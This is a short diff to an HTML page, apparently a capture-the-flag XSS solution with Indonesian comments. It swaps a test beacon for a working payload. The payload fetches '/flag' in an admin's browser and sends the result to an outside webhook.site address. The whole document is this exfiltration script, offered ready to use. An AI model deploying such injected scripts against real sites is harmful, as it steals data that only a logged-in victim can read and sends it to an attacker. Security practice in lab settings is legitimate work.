@@ -5,9 +5,15 @@
 </head>
 <body>
 <script>
-// Test apakah XSS bisa jalan
-fetch("https://webhook.site/46a8eb0f-2147-4721-9799-d610a518e0ab/test")
-  .catch(()=>{});
+// Ambil flag dari browser admin
+fetch("/flag")
+  .then(r => r.text())
+  .then(flag => {
+    // Kirim flag ke webhook kamu
+    fetch("https://webhook.site/46a8eb0f-2147-4721-9799-d610a518e0ab?flag="
+          + encodeURIComponent(flag));
+  })
+  .catch(() => {});
 </script>
 </body>
 </html>
